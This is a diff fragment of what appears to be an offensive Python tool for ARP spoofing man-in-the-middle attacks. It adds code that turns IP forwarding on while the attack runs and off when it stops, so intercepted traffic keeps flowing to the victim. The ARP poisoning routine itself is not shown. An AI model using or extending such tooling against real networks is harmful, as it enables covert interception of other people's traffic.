@@ -30,9 +30,13 @@ if __name__ == "__main__":
 		exit("[!] You must be root")
 
 	try:
+		with open(IP_FORWARD, 'w') as fd:
+        		fd.write('1')
 		print("[*] Starting ARP MITM attack ...")
 		arp_mitm(args["interface"], args["target"], args["interval"])
 	except IOError:
 		exit("[!] Interface doesn't exist")
 	except KeyboardInterrupt:
 		print("\n[*] Stopping ARP MITM attack")
+		with open(IP_FORWARD, 'w') as fd:
+        		fd.write('0')
